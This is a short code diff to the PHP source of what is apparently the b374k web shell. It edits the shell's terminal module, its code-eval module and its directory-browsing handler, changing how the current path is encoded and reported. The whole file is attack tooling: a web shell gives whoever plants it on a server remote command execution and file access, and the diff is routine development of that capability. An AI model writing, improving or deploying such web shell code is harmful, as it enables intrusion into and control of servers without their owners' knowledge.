@@ -19,7 +19,10 @@ $GLOBALS['module'] = array();
     error_log("b374k> ".$key."=".$value);
 }*/
 function encode_cwd($cwd) {
-    return bin2hex($cwd);
+    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+        $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
+    }
+    return bin2hex(encodeURIComponent($cwd));
 }
 
 $explorer_content = "";
@@ -58,7 +61,7 @@ $GLOBALS['module']['terminal']['id'] = "terminal";
 $GLOBALS['module']['terminal']['title'] = "Terminal";
 $GLOBALS['module']['terminal']['js_ontabselected'] = "
 if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
-$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".get_cwd()."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
+$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".$cwd."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
 
 
 $GLOBALS['module']['eval']['id'] = "eval";
@@ -97,7 +100,6 @@ $GLOBALS['module']['eval']['content'] = "
 $res = "";
 if(isset($p['cd'])){
 	$path = $p['cd'];
-	$path_param = $path;
 	if(trim($path)=='') $path = dirname(__FILE__);
 
 	$path = realpath($path);
@@ -111,7 +113,7 @@ if(isset($p['cd'])){
 			$res .= show_all_files($path);
 		}
 	}
-	else $res = "error|".$path_param;
+	else $res = "error";
 	output($res);
 }
 elseif(isset($p['viewFile']) && isset($p['viewType'])){
